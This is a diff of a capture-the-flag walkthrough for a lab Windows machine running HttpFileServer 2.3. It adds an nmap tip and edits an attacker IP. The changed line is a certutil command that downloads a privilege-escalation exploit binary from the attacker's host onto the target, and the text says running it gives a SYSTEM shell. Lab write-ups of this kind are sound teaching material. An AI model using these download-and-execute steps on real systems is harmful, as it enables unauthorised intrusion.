@@ -10,6 +10,7 @@ This is a simple Windows machine running `HttpFileServer 2.3` which is vulnerabl
 ```zsh
 nmap -sS -sC -v -p- 10.10.10.8
 ```
+> Try running -sC later to save time.
 
 ```console
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 01:38 EDT
@@ -207,7 +208,7 @@ Or you can get it from the repo mentioned inside the exploit.I have added the ex
 Now we have to upload this binary. Place it in the same folder where you hosted the nc.exe file and we will use certutil to upload
 
 ```cmd
-certutil.exe -urlcache -split -f http://10.10.14.10:80/41020.exe 41020.exe
+certutil.exe -urlcache -split -f http://10.10.14.8:80/41020.exe 41020.exe
 ```
 Simply execute it and you will have a shell with System privilges
 
